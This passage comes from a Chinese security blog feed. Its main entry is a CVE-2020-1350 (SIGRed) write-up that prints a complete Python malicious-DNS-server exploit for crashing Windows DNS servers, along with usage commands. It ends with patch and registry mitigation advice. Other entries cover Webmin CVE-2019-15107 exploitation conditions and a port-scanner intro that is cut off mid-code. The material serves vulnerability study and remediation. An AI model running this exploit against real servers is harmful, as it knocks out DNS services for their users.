        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <p><a href="https://www.buhuixiu.com/images/hexo_one.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/hexo_one.png"></a><p></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-1350 DNS Server远程代码执行漏洞 利用及修复建议</title>
      <link href="/2020/07/31/CVE-2020-1350-DNS-Server%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E5%88%A9%E7%94%A8%E5%8F%8A%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE/"/>
      <url>/2020/07/31/CVE-2020-1350-DNS-Server%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E5%88%A9%E7%94%A8%E5%8F%8A%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <h2 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a><font color="red">漏洞原理：</font><p>基本的原理类似于缓冲溢出，具体看是接收数据时，没有对数据长度做严格的校验，可以导致DNS服务DOWN。。或者更巧妙的方式，可以利用溢出的代码，进行远程代码执行。目前没看到别人写远程代码执行的POC，主要是使得DNS服务不可用的POC.</p><h2 id="如何利用？"><a href="#如何利用？" class="headerlink" title="如何利用？"></a>如何利用？</h2><p>利用的方式相对简单。利用自己可以控制的域名，通过NS域名解析。让DNS服务器与攻击服务器进行通讯。通过TCP通讯连接，发送构成溢出的数据。导致DNS DOWN机。<br>这里，我们只是在内网做实验。就只简单的在DNS服务器上，对一个特定的域名<font color="green">ibrokethe.net</font> 设置条件转发，让它转发到攻击服务器上。<br>如果是实际的攻击就需要利用自己可以控制的域名，去构成DNS服务器与实际攻击服务器的通讯。<br>攻击的数据包是别人写好的playload.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># CVE-2020-1350 (SIGRed)</span><br><span class="hljs-comment"># Windows DNS DoS Exploit</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Credits for the bug are entirely down to Check Point Research (@_cpresearch_) who did an incredible writeup of this bug (props to @sagitz_ for the post)</span><br><span class="hljs-comment"># Their writeup can be found at https://research.checkpoint.com/2020/resolving-your-way-into-domain-admin-exploiting-a-17-year-old-bug-in-windows-dns-servers/</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># This exploit was written by @maxpl0it</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Quick summary of how it works:</span><br><span class="hljs-comment">#   1) On the LAN you trigger a DNS request (more specifically, a request for the SIG records) for an evil domain (for example 9.evil_domain.com)</span><br><span class="hljs-comment">#   2) This gets sent to the vulnerable Windows server&#x27;s DNS server</span><br><span class="hljs-comment">#   3) The vulnerable server sends a request to whatever DNS it forwards requests to (usually the standard Google IPs)</span><br><span class="hljs-comment">#   4) The Google DNS responds with the nameservers for the evil domain</span><br><span class="hljs-comment">#   5) The vulnerable server then acts as a DNS client and sends a request to the evil DNS server</span><br><span class="hljs-comment">#   6) The evil server responds with a payload that overflows a 2-byte number, causing a smaller allocation to take place than is required</span><br><span class="hljs-comment">#   7) The signature is copied over and things break (of course), crashing the vulnerable server&#x27;s DNS server</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># General Setup:</span><br><span class="hljs-comment"># --------------</span><br><span class="hljs-comment"># This exploit requires you to set up a domain with its own nameservers pointing to your server.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Set up the server and run this script. It will listen on port 53 on both TCP and UDP</span><br><span class="hljs-comment"># If you get an error saying that the ports are busy, use netstat -pa to figure out what&#x27;s listening on the domain ports</span><br><span class="hljs-comment"># (probably systemd-resolved) and disable + stop it. If nothing&#x27;s listening on the server, make sure you killed all instances of</span><br><span class="hljs-comment"># this script before re-running.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># For example, I ran `python sigred_dos.py ibrokethe.net` to start the malicious DNS server</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Execution:</span><br><span class="hljs-comment"># ----------</span><br><span class="hljs-comment"># In order to trigger the vulnerability on the Windows DNS server, run `nslookup -type=sig 9.your_domain_name_here dns_server_to_target`</span><br><span class="hljs-comment"># For example, I ran `nslookup -type=sig 9.ibrokethe.net 127.0.0.1` as I was running this on the server.</span><br><br><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> struct<br><br>domain = <span class="hljs-literal">None</span><br>domain_compressed = <span class="hljs-literal">None</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">setup</span>():</span><br><span class="hljs-keyword">global</span> domain_compressed<br><span class="hljs-comment"># Setup</span><br>domain_split = [<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">len</span>(i)) + i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> domain.split(<span class="hljs-string">&quot;.&quot;</span>)]<br>domain_compressed = <span class="hljs-string">&quot;&quot;</span>.join(domain_split) + <span class="hljs-string">&quot;\x00&quot;</span><br><br><br><br><span class="hljs-comment"># The TCP port is contacted second</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tcp_server</span>():</span><br>sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>sock.bind((<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">53</span>))<br>sock.listen(<span class="hljs-number">50</span>)<br>response = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br><span class="hljs-keyword">try</span>:<br>connection, client_address = sock.accept()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Received TCP Connection&quot;</span>)<br>data = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-comment"># SIG Contents</span><br>sig = <span class="hljs-string">&quot;\x00\x01&quot;</span> <span class="hljs-comment"># Type covered</span><br>sig += <span class="hljs-string">&quot;\x05&quot;</span> <span class="hljs-comment"># Algorithm - RSA/SHA1</span><br>sig += <span class="hljs-string">&quot;\x00&quot;</span> <span class="hljs-comment"># Labels</span><br>sig += <span class="hljs-string">&quot;\x00\x00\x00\x20&quot;</span> <span class="hljs-comment"># TTL</span><br>sig += <span class="hljs-string">&quot;\x68\x76\xa2\x1f&quot;</span> <span class="hljs-comment"># Signature Expiration</span><br>sig += <span class="hljs-string">&quot;\x5d\x2c\xca\x1f&quot;</span> <span class="hljs-comment"># Signature Inception</span><br>sig += <span class="hljs-string">&quot;\x9e\x04&quot;</span> <span class="hljs-comment"># Key Tag</span><br>sig += <span class="hljs-string">&quot;\xc0\x0d&quot;</span> <span class="hljs-comment"># Signers Name - Points to the &#x27;9&#x27; in 9.domain.</span><br>sig += (<span class="hljs-string">&quot;\x00&quot;</span>*(<span class="hljs-number">19</span> - <span class="hljs-built_in">len</span>(domain)) + (<span class="hljs-string">&quot;\x0f&quot;</span> + <span class="hljs-string">&quot;\xff&quot;</span>*<span class="hljs-number">15</span>)*<span class="hljs-number">5</span>).ljust(<span class="hljs-number">65465</span> - <span class="hljs-built_in">len</span>(domain_compressed), <span class="hljs-string">&quot;\x00&quot;</span>) <span class="hljs-comment"># Signature - Here be overflows!</span><br><br><span class="hljs-comment"># SIG Header</span><br>hdr = <span class="hljs-string">&quot;\xc0\x0c&quot;</span> <span class="hljs-comment"># Points to &quot;9.domain&quot;</span><br>hdr += <span class="hljs-string">&quot;\x00\x18&quot;</span> <span class="hljs-comment"># Type: SIG</span><br>hdr += <span class="hljs-string">&quot;\x00\x01&quot;</span> <span class="hljs-comment"># Class: IN</span><br>hdr += <span class="hljs-string">&quot;\x00\x00\x00\x20&quot;</span> <span class="hljs-comment"># TTL</span><br>hdr += struct.pack(<span class="hljs-string">&#x27;&gt;H&#x27;</span>, <span class="hljs-built_in">len</span>(sig)) <span class="hljs-comment"># Data Length</span><br><br><span class="hljs-comment"># DNS Header</span><br>response = <span class="hljs-string">&quot;\x81\xa0&quot;</span> <span class="hljs-comment"># Flags: Response + Truncated + Recursion Desired + Recursion Available</span><br>response += <span class="hljs-string">&quot;\x00\x01&quot;</span> <span class="hljs-comment"># Questions</span><br>response += <span class="hljs-string">&quot;\x00\x01&quot;</span> <span class="hljs-comment"># Answer RRs</span><br>response += <span class="hljs-string">&quot;\x00\x00&quot;</span> <span class="hljs-comment"># Authority RRs</span><br>response += <span class="hljs-string">&quot;\x00\x00&quot;</span> <span class="hljs-comment"># Additional RRs</span><br>response += <span class="hljs-string">&quot;\x019&quot;</span> + domain_compressed <span class="hljs-comment"># Name (9.domain)</span><br>response += <span class="hljs-string">&quot;\x00\x18&quot;</span> <span class="hljs-comment"># Type: SIG</span><br>response += <span class="hljs-string">&quot;\x00\x01&quot;</span> <span class="hljs-comment"># Class: IN</span><br><span class="hljs-keyword">try</span>:<br>data += connection.recv(<span class="hljs-number">65535</span>)<br><span class="hljs-keyword">except</span>:<br><span class="hljs-keyword">pass</span><br>len_msg = <span class="hljs-built_in">len</span>(response + hdr + sig) + <span class="hljs-number">2</span> <span class="hljs-comment"># +2 for the transaction ID</span><br><span class="hljs-comment"># Msg Size + Transaction ID + DNS Headers + Answer Headers + Answer (Signature)</span><br>connection.sendall(struct.pack(<span class="hljs-string">&#x27;&gt;H&#x27;</span>, len_msg) + data[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>] + response + hdr + sig)<br>connection.close()<br><span class="hljs-keyword">except</span>:<br><span class="hljs-keyword">pass</span><br><br><br><span class="hljs-comment"># The UDP server is contacted first</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">udp_server</span>():</span><br>sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br>server_address = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span><br>server_port = <span class="hljs-number">53</span><br>sock.bind((server_address, server_port))<br>response = <span class="hljs-string">&quot;\x83\x80&quot;</span> <span class="hljs-comment"># Flags: Response + Truncated + Recursion Desired + Recursion Available</span><br>response += <span class="hljs-string">&quot;\x00\x01&quot;</span> <span class="hljs-comment"># Questions</span><br>response += <span class="hljs-string">&quot;\x00\x00&quot;</span> <span class="hljs-comment"># Answer RRs</span><br>response += <span class="hljs-string">&quot;\x00\x01&quot;</span> <span class="hljs-comment"># Authority RRs</span><br>response += <span class="hljs-string">&quot;\x00\x00&quot;</span> <span class="hljs-comment"># Additional RRs</span><br><br><span class="hljs-comment"># Queries</span><br>response += <span class="hljs-string">&quot;\x019&quot;</span> + domain_compressed <span class="hljs-comment"># Name</span><br>response += <span class="hljs-string">&quot;\x00\x18&quot;</span> <span class="hljs-comment"># Type: SIG</span><br>response += <span class="hljs-string">&quot;\x00\x01&quot;</span> <span class="hljs-comment"># Class: IN</span><br><br><span class="hljs-comment"># Data</span><br>data = <span class="hljs-string">&quot;\x03ns1\xc0\x0c&quot;</span> <span class="hljs-comment"># ns1 + pointer to 4.ibrokethe.net</span><br>data += <span class="hljs-string">&quot;\x03ms1\xc0\x0c&quot;</span> <span class="hljs-comment"># ms1 + pointer to 4.ibrokethe.net</span><br>data += <span class="hljs-string">&quot;\x0b\xff\xb4\x5f&quot;</span> <span class="hljs-comment"># Serial Number</span><br>data += <span class="hljs-string">&quot;\x00\x00\x0e\x10&quot;</span> <span class="hljs-comment"># Refresh Interval</span><br>data += <span class="hljs-string">&quot;\x00\x00\x2a\x30&quot;</span> <span class="hljs-comment"># Response Interval</span><br>data += <span class="hljs-string">&quot;\x00\x01\x51\x80&quot;</span> <span class="hljs-comment"># Expiration Limit</span><br>data += <span class="hljs-string">&quot;\x00\x00\x00\x20&quot;</span> <span class="hljs-comment"># Minimum TTL</span><br><br><span class="hljs-comment"># Authoritative Nameservers</span><br>response += <span class="hljs-string">&quot;\xc0\x0c&quot;</span> <span class="hljs-comment"># Compressed pointer to &quot;4.ibrokethe.net&quot;</span><br>response += <span class="hljs-string">&quot;\x00\x06&quot;</span> <span class="hljs-comment"># Type: SOA</span><br>response += <span class="hljs-string">&quot;\x00\x01&quot;</span> <span class="hljs-comment"># Class: IN</span><br>response += <span class="hljs-string">&quot;\x00\x00\x00\x20&quot;</span> <span class="hljs-comment"># TTL</span><br>response += struct.pack(<span class="hljs-string">&#x27;&gt;H&#x27;</span>, <span class="hljs-built_in">len</span>(data))<br><br><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br><span class="hljs-keyword">try</span>:<br>recvd, client_address = sock.recvfrom(<span class="hljs-number">65535</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Received UDP connection&quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(recvd) &gt; <span class="hljs-number">2</span>:<br><span class="hljs-built_in">print</span>(client_address)<br><span class="hljs-built_in">print</span>(response + data)<br><span class="hljs-built_in">print</span>(recvd[:<span class="hljs-number">2</span>])<br>sock.sendto(recvd[:<span class="hljs-number">2</span>] + response.encode + data, client_address)<br><span class="hljs-keyword">except</span>:<br><span class="hljs-keyword">pass</span><br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">if len(sys.argv) != 2:</span><br><span class="hljs-string">print(&quot;python sigred_dos.py evil_domain&quot;) # For example, I ran python `sigred_dos.py ibrokethe.net`</span><br><span class="hljs-string">exit()</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># Domain name must be *a maximum* of 19 characters in length</span><br><br>domain = <span class="hljs-string">&#x27;ibrokethe.net&#x27;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(domain) &gt; <span class="hljs-number">19</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Domain length must be less than 20 characters&quot;</span>)<br><br>setup()<br><br><span class="hljs-comment"># Sets up two servers: one on UDP port 53 and one on TCP port 53</span><br>first = threading.Thread(target=udp_server)<br>second = threading.Thread(target=tcp_server)<br><br>first.start()<br>second.start()<br><br>first.join()<br>second.join()<br><br><br></code></pre></td></tr></table></figure><p>整个代码的主要功能就是利用两个线程分别在UDP,TCP 53端口构成监听。监听到DNS请求后，通过发送响应数据payload,从而构成请求方DNS服务器的溢出，造成DNS服务宕机。</p><h2 id="别人的图"><a href="#别人的图" class="headerlink" title="别人的图"></a><font color="green">别人的图</font></h2><p><a href="https://www.buhuixiu.com/images/CVE-2020-1350.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/CVE-2020-1350.png"></a></p><h2 id="我自己的实验"><a href="#我自己的实验" class="headerlink" title="我自己的实验"></a><font color="green">我自己的实验</font></h2><p><a href="https://www.buhuixiu.com/images/CVE-2020-1350-2.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/CVE-2020-1350-2.png"></a><br><a href="https://www.buhuixiu.com/images/CVE-2020-1350-3.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/CVE-2020-1350-3.png"></a><br><a href="https://www.buhuixiu.com/images/CVE-2020-1350-4.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/CVE-2020-1350-4.png"></a></p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>推荐的修复方式当让是更新微软的补丁，响应补丁比较大。1G多,是一个2016的累积更新包。<br><a href="http://download.windowsupdate.com/c/msdownload/update/software/secu/2020/07/windows10.0-kb4565511-x64_5d2481cbc9319147ad3c8f42e07a0ee182909be9.msu">2020-适用于Windows Server2016 的07累积更新 适用基于X64的系统（KB4565511) </a></p><p>临时修复方案。更改注册表值。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">@echo off<br>reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters&quot; /v &quot;TcpReceivePacketSize&quot; /t REG_DWORD /d 0xFF00 /f<br>net stop DNS &amp;&amp; net start DNS<br></code></pre></td></tr></table></figure><p><font color="2bbc8a">相应特征识别应该比较容易被应用防火墙和态势感知设备所识别。所以，关注这些设备的一些日志报警和DNS的异常宕机。可以评估下响应的风险，尽快修复该漏洞。。</font></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> CVE-2020-1350-DNS-Server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cve-2019-15107验证</title>
      <link href="/2020/07/28/cve-2019-15107%E9%AA%8C%E8%AF%81/"/>
      <url>/2020/07/28/cve-2019-15107%E9%AA%8C%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <h2 id="相关漏洞利用条件"><a href="#相关漏洞利用条件" class="headerlink" title="相关漏洞利用条件"></a>相关漏洞利用条件<p>1， 官方给的漏洞影响版本为Webmin&lt;=1.920，于是当晚我使用了Webmin 1.920的版本进行的测试<br>2， 在1.920版本中漏洞的触发需要开启密码重置功能，<font color="green">“Webmin-&gt; Webmin Configuration-&gt; Authentication”</font> 下把允许用户使用旧密码设置新密码的选项给选上，并保存！<br><a href="https://www.buhuixiu.com/images/cve-2019-15107-3.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/cve-2019-15107-3.png"></a><br><a href="https://www.buhuixiu.com/images/cve-2019-15107-4.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/cve-2019-15107-4.png"></a><br>3,  原以为在利用过程中，需要修改一个配置文件。<font color="red">/etc/webmin/config     referers_none=1</font><br>一直在如下的错误提上纠结。</p><p> 但是后来想起，referers是可以轻松欺骗的。所以这个不是利用的必须条件。</p><h2 id="相关利用也非常的简单。"><a href="#相关利用也非常的简单。" class="headerlink" title="相关利用也非常的简单。"></a>相关利用也非常的简单。</h2><p><a href="https://www.buhuixiu.com/images/cve-2019-15107-1.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/cve-2019-15107-1.png"></a><br>但是，过程其实也蛮艰辛。。主要在下面这个问题上绕圈圈。<br>其他的一些文档和payload上面都没发现类似的问题。看了别人的，也很少单独添加 referers，也可以执行远程命令的。<br><a href="https://www.buhuixiu.com/images/cve-2019-15107-5.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/cve-2019-15107-5.png"></a></p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p><a href="https://www.buhuixiu.com/images/cve-2019-15107-2.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/cve-2019-15107-2.png"></a></p><h2 id="漏洞利用原理分析"><a href="#漏洞利用原理分析" class="headerlink" title="漏洞利用原理分析"></a>漏洞利用原理分析</h2><p> 请参考 <a href="https://blog.csdn.net/qq_43380549/article/details/100011292">Webmin(CVE-2019-15107) 远程代码执行漏洞之 backdoor 探究”</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> CVE-2019-15107-Webmin </category>
          
      </categories>
      
      
        <tags>
            
            <tag> poc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python 多线程扫描及资源冲突锁定应用</title>
      <link href="/2020/07/22/python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%89%AB%E6%8F%8F%E5%8F%8A%E8%B5%84%E6%BA%90%E5%86%B2%E7%AA%81%E9%94%81%E5%AE%9A%E5%BA%94%E7%94%A8/"/>
      <url>/2020/07/22/python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%89%AB%E6%8F%8F%E5%8F%8A%E8%B5%84%E6%BA%90%E5%86%B2%E7%AA%81%E9%94%81%E5%AE%9A%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <p><a href="https://www.buhuixiu.com/images/learn-python-tutorials.jpg" class="gallery-item"><img src="https://www.buhuixiu.com/images/learn-python-tutorials.jpg"></a><p></p><h2 id="面对多个云场景的应用，服务器大量的规则调整，临时规则，变更，安全组错误配置等。所以需要对多个云端的服务器进行端口扫描。"><a href="#面对多个云场景的应用，服务器大量的规则调整，临时规则，变更，安全组错误配置等。所以需要对多个云端的服务器进行端口扫描。" class="headerlink" title="面对多个云场景的应用，服务器大量的规则调整，临时规则，变更，安全组错误配置等。所以需要对多个云端的服务器进行端口扫描。"></a>面对多个云场景的应用，服务器大量的规则调整，临时规则，变更，安全组错误配置等。所以需要对多个云端的服务器进行端口扫描。</h2><p>幸运的是，云服务商一般提供了比较详细的服务器配置清单。这份清单可以很方便我们进行端口扫描。从而发现我们在<br>主机安全层，端口安全方面存在的一些问题。比如说，直接开饭22端口。比如说，测试环境的6379 等数据库端口暴露在公网或者内网等。<br>话不多说。直接copy一点点代码。</p><h2 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h2><h5 id="1-1-目前程序中写死了线程数：50"><a href="#1-1-目前程序中写死了线程数：50" class="headerlink" title="1.1  目前程序中写死了线程数：50"></a>1.1  目前程序中写死了线程数：50</h5><h5 id="1-2-相应的数据从云平台按照默认全部方式导出数据。相应的内网IP和外网IP在第13，14行。华为云需要单独进行处理下数据。阿里云只需要插入行数满足就OK"><a href="#1-2-相应的数据从云平台按照默认全部方式导出数据。相应的内网IP和外网IP在第13，14行。华为云需要单独进行处理下数据。阿里云只需要插入行数满足就OK" class="headerlink" title="1.2 相应的数据从云平台按照默认全部方式导出数据。相应的内网IP和外网IP在第13，14行。华为云需要单独进行处理下数据。阿里云只需要插入行数满足就OK."></a>1.2 相应的数据从云平台按照默认全部方式导出数据。相应的内网IP和外网IP在第13，14行。华为云需要单独进行处理下数据。阿里云只需要插入行数满足就OK.</h5><h5 id="1-3-导出的csv文件可以放在单一的文件夹下，或者分别防止在三个路径下。可以扫描到所有的csv后缀文件名。"><a href="#1-3-导出的csv文件可以放在单一的文件夹下，或者分别防止在三个路径下。可以扫描到所有的csv后缀文件名。" class="headerlink" title="1.3 导出的csv文件可以放在单一的文件夹下，或者分别防止在三个路径下。可以扫描到所有的csv后缀文件名。"></a>1.3 导出的csv文件可以放在单一的文件夹下，或者分别防止在三个路径下。可以扫描到所有的csv后缀文件名。</h5><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>PYTHON 3.8 默认，无其他的扩展包。</p><h2 id="threadingportscan-py-用于多线程端口扫描及将结果写入csv-文件中。"><a href="#threadingportscan-py-用于多线程端口扫描及将结果写入csv-文件中。" class="headerlink" title="threadingportscan.py  用于多线程端口扫描及将结果写入csv 文件中。"></a>threadingportscan.py  用于多线程端口扫描及将结果写入csv 文件中。</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span 